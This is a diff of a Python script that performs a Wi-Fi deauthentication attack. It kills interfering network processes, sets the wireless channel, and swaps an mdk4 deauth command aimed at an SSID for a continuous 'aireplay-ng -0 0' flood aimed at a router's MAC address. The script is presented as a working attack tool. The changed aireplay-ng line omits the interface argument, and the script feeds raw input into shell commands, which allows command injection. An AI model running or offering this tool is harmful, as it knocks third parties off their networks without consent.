@@ -5,9 +5,8 @@ os.system("sudo airmon-ng check kill")
 ent_ch = input("enter your network channel: ")
 os.system(f"sudo iwconfig {interface} channel {ent_ch}")
 try: 
-  ssid = input("enter the ssid/name_of_the_wifi of the router: ")
-  os.system(f"sudo mdk4 {interface} d -E {ssid}")
-  print(f"attacking {ssid}")
+  ap = input("enter the bssid/mac_address of the router: ")
+  os.system(f"sudo aireplay-ng -0 0 -a {ap}")
 except KeyboardInterrupt:
   print("exited")
 
